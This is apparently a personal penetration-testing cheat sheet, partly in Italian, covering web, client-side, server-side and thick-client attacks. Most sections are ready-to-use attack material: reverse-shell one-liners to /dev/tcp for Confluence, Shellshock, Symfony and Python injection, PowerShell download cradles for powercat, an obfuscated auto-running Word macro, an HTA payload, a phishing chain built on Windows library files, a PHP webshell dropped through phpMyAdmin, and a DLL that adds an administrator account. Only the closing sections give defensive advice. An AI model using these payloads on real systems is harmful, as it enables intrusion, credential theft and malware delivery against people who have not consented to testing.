### <ins>phpLDAPadmin</ins>

- Endpoint: `phpldapadmin/index.php`
- Try default logins
- XSS
  - `cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1`
  - `cmd.php?server_id=<script>alert('Orwa')</script>`
- See [Godfather Orwa's tweet](https://twitter.com/GodfatherOrwa/status/1701392754251563477)



### <ins>Git source code exposure</ins>

Once you have the source code, look for the secrets within the files. To find secrets, you can use [trufflehog](https://github.com/trufflesecurity/trufflehog).

**Other tools**
- [DotGit](https://github.com/davtur19/DotGit) find if a website has `.git` exposed
- nuclei template `%USERPROFILE%\nuclei-templates\exposures\configs\git-config.yaml`
- [GitDumper from GitTools](https://github.com/internetwache/GitTools)



### <ins>Subdomain takeover</ins>

**Tools**
- [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
- nuclei template `%USERPROFILE%\nuclei-templates\takeovers`



### <ins>4** Bypass</ins>
- [byp4xx](https://github.com/lobuhi/byp4xx), s/o to [m0pam](https://twitter.com/m0pam) for the tip
- Search for subdomain with subfinder. Httpx filters subdomains with a 403 response and prints their cname. Test the cname for a bypass
  `subfinder -d atg.se — silent | httpx -sc -mc 403 -cname`, s/o to [drak3hft7](https://twitter.com/drak3hft7) for the tip
- [403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122) Burp extension, test 403 bypasses on the run
- Replace `HTTP/n` with `HTTP/1.1`, `HTTP/2` or `HTTP/3`
- Change the request from `GET` to `POST` or viceversa



### <ins>Application level Denial of Service</ins>

- If the application gives the possibility to download data, try to download too much data
  - If there are restrictions, try to bypass
- In file uploads, try to upload huge files
- In chat section, try to send big messages and see how the application behaves
- [Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
  - search for [`RegExp()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp)
- Long Password DoS Attack (Note: the value of password is hashed and then stored in Databases)
  - Check for length restriction and play with it
  - If there is no restriction, test until the application slows down
  - [password.txt](https://raw.githubusercontent.com/KathanP19/HowToHunt/master/Application_Level_DoS/Password.txt)
- Long string DoS
- DoS against a victim
  - Sending a reset link might disable an user's account, spam to prevent the user from accessing their account
  - Multiple wrong passwords might disable an user's account

### <ins>APIs attacks</ins>

Common API path convention: `/api_name/v1`

#### Bruteforce APIs paths with gobuster

1. Create a pattern file
   ```
   echo {GOBUSTER}/v1 > patterns
   echo {GOBUSTER}/v2 >> patterns
   echo {GOBUSTER}/v3 >> patterns
   ```
2. Run the command `gobuster dir -u <TARGET> -w /usr/share/wordlists/wordlist.txt -p patterns`
3. Inspect the endpoints fuond with `curl` and use recursion


### <ins>Grafana attacks</ins>

**CVE-2021-43798**: Grafana versions 8.0.0-beta1 through 8.3.0, except for patched versions, are vulnerable to directory traversal
- `curl --path-as-is http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
  - Check also for sqlite3 database `/var/lib/grafana/grafana.db` and `conf/defaults.ini` config file


### <ins>Confluence attacks</ins>


#### CVE-2022-26134

1. See: [Active Exploitation of Confluence CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)
2. `curl http://<Confluence-IP>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<YOUR-IP>/<YOUR-PORT>%200%3E%261%27%29.start%28%29%22%29%7D/`
3. Run a listener `nc -nvlp 4444`


#### <ins>Kibana</ins>

- RCE https://github.com/mpgn/CVE-2019-7609
- If you are unable to get code execution reset the machine and try again in a incognito browser window.
- Remember run the payload on Timelion and then navigate Canvas to trigger it


#### <ins>Argus Surveillance DVR</ins>

- LFI: `http://192.168.212.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22`
- Password located at `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`
  - weak password encryption
  - l'exploit trova un carattere per volta. Non funziona con i caratteri speciali > se trovi 'Unknown' significa che `e un carattere speciale e lo devi scoprire manualmente
  

#### <ins>Shellshock</ins>

- If you find `/cgi-bin/`, search for extensions `sh`, `cgi`, `py`, `pl` and more
- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.49.124/1234 0>&1' http://192.168.124.87/cgi-bin/test.sh`


#### <ins>Cassandra web</ins>

- `pip install cqlsh`
- `cqlsh <IP>`
- `sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:4444`
  - runnato come root, puoi vedere tutti i file del sistema
  - `curl --path-as-is localhost:4444/../../../../../../../../etc/passwd`
- https://book.hacktricks.xyz/network-services-pentesting/cassandra
- https://medium.com/@manhon.keung/proving-grounds-practice-linux-box-clue-c5d3a3b825d2


#### <ins>RaspAP</ins>

- `http://192.168.157.97:8091/includes/webconsole.php`


#### <ins>Drupal</ins>

- Enumerate version by seeing `/CHANGELOG.txt`
- `droopescan scan drupal -u http://10.10.10.9`

Drupalgeddon
- Check also Drupalgeddon2
- `python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=GCGJfJI7t9GIIV7M7NLK8ARzeURzu83jxeqI2_qcDGs" 1 "whoami"`


#### <ins>Tomcat</ins>

- Default creds
  - `tomcat:s3cret`
  - https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
- File uploads in tomcat/manager
  1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=4445 -f war > shell.war`
  2. Go to `http://10.10.10.85/shell`


#### <ins>Booked Scheduler</ins>

- 2.7.5 RCE: https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF
- LFI: `http://192.168.243.64:8003/booked/Web/admin/manage_email_templates.php?dr=template&lang=en_us&tn=../../../../../../../../../etc/passwd&_=1588451710324`


#### <ins>phpMyAdmin</ins>

- Se presente, testare `root` senza password. Se non funziona, utilizzare root:password
- Se si riesce a fare login, si pu`o fare RCE con la seguente query
  SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"
  SELECT LOAD_FILE('C:\\xampp\\htdocs\\nc.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
  
  
#### <ins>PHP</ins>

- Command Execution - `preg_replace()` PHP Function Exploit - RCE https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4
- `<?php echo system($_GET['cmd']); ?>`
- [Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)


#### <ins>Symphony</ins>

- [Symphony | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/symphony)
- http://victim.com/app_dev.php/_profiler/open?file=app/config/parameters.yml
  - get the 'secret'
- https://github.com/ambionics/symfony-exploits
  - `python3 secret_fragment_exploit.py 'http://192.168.164.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.164.233/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/192.168.45.154/80 0>&1'"`


#### <ins>Adobe ColdFusion</ins>

- See if you find `/CFIDE` or `.cfm` pages
- It usually runs on port `8500`
- RCE: https://www.exploit-db.com/exploits/50057


#### <ins>Webmin</ins>

- https://github.com/MuirlandOracle/CVE-2019-15107
  - type 'shell' to get a reverse shell (use ncat with rlwrap)


## Client-Side Attacks

### <ins>Client Information Gathering</ins>

**Passive Client Information Gathering**
- Search with Google, social media and forum websites
- Search for IPs and other sensible information
- Search for file in the target's websites with `dirsearch` or `gobuster`, retrieve metadata from files
  - `exiftool -a -u brochure.pdf`

**Active Client Information Gathering**
- Make direct contact with the target machine or its users
  - Interaction with the target: Social engineering, require to click on a link, open an email, run an attachment, or open a document
  - [Social-Engineer Toolkit (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)
- Client Fingerprinting
  - [Fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs)
    - Change permissions on the `fp` directory `sudo chown www-data:www-data fp` to make `/fp/js.php` work
  - [Parse User Agents](https://developers.whatismybrowser.com/)
- Use [Canarytokens](https://canarytokens.org/generate) and Social Engineering to retrieve information from a target
- Use [Grabify IP Logger](https://grabify.link/)

### <ins>HTML applications</ins>

If a file is created with a `.hta` extension rather than a `.html` extension, Internet Explorer will automatically recognize it as an HTML Application and provide the option to run it using the mshta.exe application (still useful since many corporations rely on Internet Explorer).

**PoC.hta** leveraging ActiveXObjects
```HTML
<html>
	<head>
		<script>
			var c= 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	</head>
	<body>
		<script>
			self.close();
		</script>
	</body>
</html>
```

**Create a better payload with [msfvenom from the Metasploit framework]([https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework))**<br/>
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o /var/www/html/evil.hta

In evil.hta, the code will find the following command ::> `powershell.exe -nop -w hidden -e aQBmCgAWBJAG4AdAQAHQAcg...`

-nop: NoProfile
-w:   WindowStyle hidden
-e:   EncodedCommand
```

### <ins>Microsoft Office</ins>

**Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.

1. From your powershell, prepare the command encoded in base64
   ```
   $TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"
   $ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXT))
   echo $ENCODED
   ```
2. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
   ```python
   import sys
   str = "powershell.exe -nop -w hidden -e " + sys.argv[1]
   n = 50
   for i in range(0, len(str), n):
   	print ("Str = Str + " + '"' + str[i:i+n] + '"')
   ```
3. This will be the final result:
   ```VBA
   Sub AutoOpen()
   	MyMacro
   End Sub
   
   Sub Document_Open()
   	MyMacro
   End Sub
   
   Sub MyMacro()
   	Dim Str As String
   	
   	Str = Str + "powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa"
   	Str = Str + "2+bSBT9nEj5D6iyBCjExombNpEqLdgmhhrHBD9iu9YKwwBTj4H"
   	Str = Str + "C4Jh0+9/3jg1pqqS77UqLbDGP+zz3zFz8PHIpjiMuu+1xX0+Oj"
   	Str = Str + "4ZO6mw4oRa/u5C4GnZvxaMjWK49GhfcB05YKEnSiTcOjpbX1+0"
   	Str = Str + "8TVFED/P6DaJKlqHNimCUCSL3FzcNUYrOblefkUu5r1ztz/oNi"
       	...
   	Str = Str + "aNrT16pQqhMQu61/7ZgO989DRWIMdw/Di/NWRyD0Jit8bW7V0f"
   	Str = Str + "T2HIOHYs1NZ76MooKEk7y5kGfqUvGvJkOWvJ9aOk0LYm5JYnzt"
   	Str = Str + "AUxkne+Miuwtq9HL2vyJW3j8hvLx/Q+z72j/s/hKKslRm/GL9x"
   	Str = Str + "4XfwvR3U586mIKgDRcoQYdG/joCJT2efexAVaD2fvmwT9XbnJ4"
   	Str = Str + "N4BPo5PhvyjwHqBILAAA="
   
   	CreateObject("Wscript.Shell").Run Str
   End Sub
   ```
4. Open the document in Word, go in `View` > `Macros` and create a macro with the code generated in the previous step
   - Select the current document in `Macros in:`

**Object Linking and Embedding**: another option is to abuse Dynamic Data Exchange (DDE) to execute arbitrary applications from within Office documents ([patched since December of 2017](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021))

1. Create a batch script to run a reverse shell
   ```batch
   START powershell.exe -nop -w hidden -e <BASE64>
   ```
2. Open Microsoft Word > Create a new document > Navigate to the Insert ribbon > Click the Object menu
3. Choose "Create from File" tab and select the newly-created batch script
4. Change the appearance of the batch file

**Evading Protected View**: In exactly the same way as Word and Excel, Microsoft Publisher permits embedded objects and ultimately code execution, but it will not enable Protected View for documents that are distributed over the Internet.

### <ins>Windows Library Files</ins>

Library files consist of three major parts written in XML to specify the parameters for accessing remote locations:
- General library information
- Library properties
- Library locations

1. Run a WebDAV share in the attacker machine
   - `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/WebDAV/`
2. Create the following Windows Library File in a Window machine
   <br/><i>config.Library-ms</i>
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
   
   	<name>@windows.storage.dll,-34582</name>
   	<version>6</version>
   
   	<isLibraryPinned>true</isLibraryPinned>
   	<iconReference>imageres.dll,-1003</iconReference>
   	
   	<templateInfo>
   		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
   	</templateInfo>
   	
   	<searchConnectorDescriptionList>
   		<searchConnectorDescription>
   			<isDefaultSaveLocation>true</isDefaultSaveLocation>
   			<isSupported>false</isSupported>
   			<simpleLocation>
   				<url>http://IP</url>
   			</simpleLocation>
   		</searchConnectorDescription>
   	</searchConnectorDescriptionList>
   
   </libraryDescription>
   ```
3. In a Window machine, create a shortcut ( <i>automatic_configuration.lnk</i> ) with the following as location
   - `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell"`
4. Put `config.Library-ms` and `automatic_configuration.lnk` in the WebDAV directory
5. Start the Python3 web server on port `8000` to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
6. Send the library file to the victim and wait for them to execute the shortcut file to get a reverse shell

### <ins>Phishing</ins>

- Leverage ports 110 and 25
- https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish

**ODT**: https://www.exploit-db.com/exploits/44564
- `python2 /usr/share/exploitdb/exploits/windows/local/44564.py`
- `sudo responder -I tun0 -v`
- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`

**NTLM theft**
- https://github.com/Greenwolf/ntlm_theft
- `python3 ntlm_theft.py -g all -s 192.168.45.201 -f test`
- `sudo responder -I tun0 -v`
- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`

**Redirecting NTLMv2**
- `python2 44564.py`
- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.226.169 -c "powershell -e base64"`
  - only possible if there is an smb on the target

**Upload a lmk link that redirects to the following**
- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213/powercat.ps1');powercat -c 192.168.45.213 -p 8039 -e powershell"`

**Macro**
- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
- `python 4_doc_macro.py BASE64`
- create doc with macros and Libreoffice
  - Tools > Macro
  - Tools > Customize > Events > Open Document
- Spreadsheet > This also runs macros
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.154 LPORT=443 -f hta-psh -o evil.hta`
  - another way to create macros, then cat the file to copy it

**Send an email**
- `sudo swaks -t <recipient> -t <recipient> --from <sender> --attach @<Windows-Library-file> --server <IP> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
- use WebDAV


### <ins>McAfee</ins>
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)


## Server-Side attacks

### <ins>NFS</ins>

- > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
- Ports: 2049, 111
- Show the NFS server’s export list: `showmount -e <target>`
  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
- Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
  - `mount -t nfs [-o vers=2] 192.168.182.216:/srv/share /tmp/mount -o nolock`
  - `sudo mount -t nfs 192.168.182.216:/share /tmp/mount`
  - `mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount`
  - If the mount is restricted to localhost, try with an ssh tunnel or similar
- See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- One liner to extract credentials
  - `grep -rnlE 'username|password|admin' /path/to/directory | grep -Ev '\.css$|\.html$|\.js$' | xargs -I {} grep -nHE --color=always 'username|password|admin' {} | sed -E 's/(username|password|admin)/\x1b[31m\1\x1b[0m/g'`

**Root Squashing**
- Root Squashing is how NFS prevents an obvious privilege escalation
- `no_root_squash` turns root squashing off
- example: `/srv/share  localhost(rw,sync,no_root_squash)`
  ```
  showmount -e 192.168.182.216
  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
  ```
  1. VICTIM: `cp /bin/bash .`
  2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
  3. VICTIM: `./bash -p`
- if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
  ```
  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
  ```
  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
- Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe


### <ins>IKE - Internet Key Exchange</ins>

- common port: `500/udp-tcp`
  - nmap sometimes says `isakmp?`
- Initial scan
  - `ike-scan IP`
- see also SNMP
  - port `161/udp-tcp`


### <ins>SNMP</ins>

- if you see this, maybe with IKE, can mean that this service is used to block any interaction from external hosts
  - if you can configure it, you can bypass this kind of proxy and rerun nmap
- common port: `161/udp-tcp`
- `snmpwalk -v2c -c public IP`
  - you might find a md5 or ntlm password
If you have found a password
1. `echo 'IP : PSK "PASSWORD1234"' >> /etc/ipsec.secrets`
2. `sudo gedit /etc/ipsec.conf`
3. `sudo ipsec stop`
4. `sudo ipsec start --nofork`
- See Hack The Box / Conceal
- When you run again nmap, use `-sT`


### <ins>NodeJS</ins>

- Reverse shell: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
- If you find JS injection, you find RCE. Try this payload: `(function(){return 2+2;})();`
  - if the result is `4`, then it is a good sign


### <ins>Python</ins>

- https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
- check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/192.168.45.221/445 0>&1')`
- alternatives
  - `__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#`
  - `curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/192.168.49.195/445 0>&1")#' http://192.168.195.117:50000/verify`
  - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/192.168.49.195/445+0>%261')%2`


### <ins>Redis 6379</ins>

- `nmap --script redis-info -sV -p 6379 IP`
- `redis-cli -h IP`
  - try command `info`
  - if no login, run the command: `config get *`
- To dump the db: `redis-utils` and `redis-dump`
- Deafult config file: `/etc/redis/redis.conf`

**SSRF**
- eval "dofile('//myip/share')" 0
  - run also with `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
  - `hashcat -m 5600 -a 0 user.hash /usr/share/wordlists/rockyou.txt`

**Possible RCEs, see with searchsploit**
- [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)
  - if you don't need user:password, `python3 redis-rogue-server.py --rhost RHOST --lhost LHOST`
- [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
- other RCE (combine the two commands):
  - python redis-rce.py -r 192.168.220.166 -L 192.168.45.181 -f exp.so -a 'Ready4Redis?'
  - python3 redis-rogue-server.py --rhost 192.168.220.166 --rport 80 --lhost 192.168.45.181 --lport 7080 --exp=exp.so -v --passwd='Ready4Redis?'

**Resources**
- [6379 - Pentesting Redis | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [4 :6379 redis Writeup](https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/sybaris/4-6379-redis)
- [Readys Write Up — Proving Grounds](https://medium.com/@C4berowl/readys-write-up-proving-grounds-e066074eed)



### <ins>Oracle TNS</ins>

- HackTricks: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
- Common ports: `1521`, `1748`
- TNS poison: `python3 odat.py tnspoison -s <IP> -p <PORT> -d <SID> --test-module`

1. Enumeration - version
- `nmap --script "oracle-tns-version" -p 1521 -T4 -sV IP`
- `tnscmd10g COMMAND -p 1521 -h IP`
  - commands: `ping`, `version`, `status`, `services`, `debug`, `reload`, `save_config`, `stop`
  - if it gives you an error, try '--10G'
  - See description of errors here: https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm

2. Enumerate SID
- `hydra -L '/home/kali/Documents/lists/oracle-tns/sids-oracle.txt' -s 1521 IP oracle-sid`
- `python3 odat.py sidguesser -s IP -p 1521`

3. Password guess
- `python3 odat.py passwordguesser -s IP -p 1521 -d XE --accounts-file accounts/accounts_large.txt`
- `nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n IP`

4. Upload arbitrary files
- `python3 odat.py utlfile -s IP -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe shell.exe`

5. Execute files
- `python3 odat.py externaltable -s IP -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe`


### <ins>Memcached</ins>

- `telnet IP 11211`
- `msf > use auxiliary/gather/memcached_extractor`
- `memcdump --servers=IP`
- `memccat --servers=IP <item1> <item2>`
- CVE-2021-33026 RCE
  - `python cve-2021-33026_PoC.py --rhost IP --rport 5000 --cmd "curl http://ATTACKERIP" --cookie "session:de43fcb3-d960-4851-b14a-f7da3993e33d"`


### <ins>SMTP / IMAP</ins>

- `sudo perl ~/Documents/scripts/smtp/smtp-user-enum.pl -M VRFY -U /home/kali/Documents/lists/common_list/usernames.txt -t IP`
- Connect to imap
  ```
  telnet IP 110
  USER sales
  PASS sales
  list         <# list messages  #>
  retr 1       <# show message 1 #>
  ```
- connect to smtp
  ```
  nc -v IP 25
  helo test
  MAIL FROM: it@postfish.off
  RCPT TO: brian.moore@postfish.off
  DATA
  [write now the body of the email]
  <CR><LF>.<CR><LF>
  QUIT
  ```
- Another IMAP connection
  ```
  nc IP 143
  tag login jonas@localhost SicMundusCreatusEst
  tag LIST "" "*"
  tag SELECT INBOX
  tag STATUS INBOX (MESSAGES)
  tag fetch 1 (BODY[1])
  ```
- `sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s IP:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a bomb.ods`



### <ins>113 ident</ins>

- `nc -vn IP 113`
- `ident-user-enum IP 113`
  - you can enumerate users for every port
  - > "Is an Internet protocol that helps identify the user of a particular TCP connection"
- https://book.hacktricks.xyz/pentesting/113-pentesting-ident



### <ins>FreeSWITCH</ins>

- Discover password: `/etc/freeswitch/autoload_configs/event_socket.conf.xml`


### <ins>Umbraco</ins>

- Umbraco Database Connection Credentials: `strings App_Data/Umbraco.sdf | grep admin`
  - See these resources:
    - https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials
    - https://app.hackthebox.com/machines/234


### <ins>VoIP penetration test</ins>

- `python3 sipdigestleak.py -i IP`
  - Find credentials
- `sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav`
  - decrypt raw voip data


### <ins>DNS</ins>

**DNS zone transfer**
- `dig axfr @<DNS_IP>`
- `dig axfr @<DNS_IP> <DOMAIN>`
- `fierce --domain <DOMAIN> --dns-servers <DNS_IP>`
- `host -l domain.com nameserver`
- `dnsrecon -d domain.com -a`
- `dnsrecon -d domain.com -t axfr`
- `dnsenum domain.com`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer


## Thick client vulnerabilities

### <ins>DLL Hijacking</ins>

**Tool**
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking

**Process**
1. Use winPEAS to enumerate non-Windows services: `.\winPEASany.exe quiet servicesinfo`
2. Enumerate which of these services our user has stop and start access to `.\accesschk.exe /accepteula -uvqc user <service>`
3. Once it's found wich service is vulnerable to dll hijacking, find the executable's path with `sc qc dllsvc`
4. Using Process Monitor, add these the filters to find missing dlls.
   <img src="img/procmon-config-add.png" alt="procmon-config">
5. Generate a reverse shell DLL named hijackme.dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll`
6. Run again the vulnerable service: `net stop <service>` and `net start dllsvc`

**Another example of a dll**:
```c++
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Perform initialization tasks for the DLL when it is loaded
	    
	    int i;
  	    i = system ("net user eviladmin Ev!lpass /add");
  	    i = system ("net localgroup administrators eviladmin /add");
	    
            break;
        case DLL_PROCESS_DETACH:
            // Perform cleanup tasks for the DLL when it is unloaded
            break;
        case DLL_THREAD_ATTACH:
            // Perform initialization tasks for each new thread that loads the DLL
            break;
        case DLL_THREAD_DETACH:
            // Perform cleanup tasks for each thread that unloads the DLL
            break;
    }
    return TRUE;
}
```
- `x86_64-w64-mingw32-gcc dllh.cpp --shared -o dllh.dll`

**Resources**
- [hijacklibs.net](https://hijacklibs.net/)
- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
- [Spartacus DLL Hijacking](https://github.com/Accenture/Spartacus)



### <ins>Insecure application design</ins>

The application design is based on a two-tier architecture. In particular, the thick client application installed on the workstation communicates directly with a backend DBMS without the use of an application server.

The best option, from a security perspective, is designing and implementing a three-tier architecture in which the thick client connects with an intermediary layer (an application server), which in turn communicates with the database. A secure channel must be used for all communications, with only secure protocols (such TLS, HTTPS, etc.), and preferebli with Certificate Pinning.

If this is not possible, it is desirable to provide read-only users and read/write users distinct privileges at the DBMS layer. This would stop vertical privilege escalation even if a read-only user were to access the database directly and try to edit the data.



### <ins>Weak Hashing Algorithms</ins>

Sensitive data exposure, key leakage, broken authentication, insecure sessions, and spoofing attacks can all be caused by improper application of encryption methods. Some hashing or encryption techniques, such MD5 and RC4, are known to be insecure and are not advised for use.

When dealing with hashing algorithms, the strongest algorithm available should be used (e.g., SHA-512 or at least SHA-256). However, it is always crucial to take into account the precise context in which the hashing algorithm must be used. For instance, it is recommended to utilize contemporary hashing algorithms that have been created especially for securely saving passwords when managing passwords. This indicates that they should be slow (as opposed to fast algorithms like MD5 and SHA-1), and that can be configured by changing the work factor (e.g., PBKDF2 or Bcrypt)

If not configured correctly, the encryption can be not sufficiently secure. An example with AES, an algorithm for symmetric encryption:
- Cipher-Block-Chaining (CBC) is no longer considered safe when verifiable padding has been applied without first ensuring the integrity of the ciphertext, except for very specific circumstances. If implemented, it can weakens AES encryption.



### <ins>Cleartext secrets in memory</ins>

The memory analysis of an application, done when the thick client process is running, can highlight the presence of secrets in cleartext and that can be therefore extracted by any user having access to the machine where the application is hosted.

**Resource**
- [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there



### <ins>Hardcoded secrets</ins>

Sometimes, the thick client application's source code is not obfuscated, therefore a hostile user may decompile it and easily comprehend every functionality of the application. It's also possible that more can be found, like credentials and api keys.

**Resources**
- [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile a VB application
- [ILSpy](https://github.com/icsharpcode/ILSpy) | [dnSpy](https://github.com/dnSpy/dnSpy) .NET decompilers



### <ins>Unsigned binaries</ins>

If an application executable, and/or the imported DLLs, has not been digitally signed, it's possible replace it with a tampered version without the user noticing.

**Resource**
- [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable



### <ins>Lack of verification of the server certificate</ins>

Due to the fact that the client does not verify the TLS certificate presented by the back-end, it's possible to intercept also HTTPS communications managed by the thick client application.

Without effective certificate control, an attacker who is capable of conducting a Man in the Middle attack can provide a self-signed certificate and the application will accept it, invalidating the protection provided by the TLS connection.



### <ins>Insecure SSL/TLS configuration</ins>

During the SSL/TLS negotiation, SSL/TLS connections may be set up to offer outdated protocols and cipher suites that are susceptible to known security flaws. The data transmitted between the server and the client could potentially be read or modified in this case if an attacker is able to intercept the communication.

**Resource**
- [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & more



### <ins>Remote Code Execution via Citrix Escape</ins>

If Citrix is present and you have access to it, there are multiple ways you can achieve Remote Code Execution:
- Try to upload a PowerShell
- Search for a functionality that opens a dialog box. Insert the path for `cmd` and `PowerShell` and see if they pop-up
- In a dialog box, see if the right-click is allowed. Play with the functionality to achieve RCE, like creating a `.bat` and running it or upload files
- Upload [Process Hacker](https://processhacker.sourceforge.io/) and see if you find [Cleartext secrets in memory](#cleartext-secrets-in-memory)

**Resources**
- [PowerShell](https://github.com/PowerShell/Powershell)
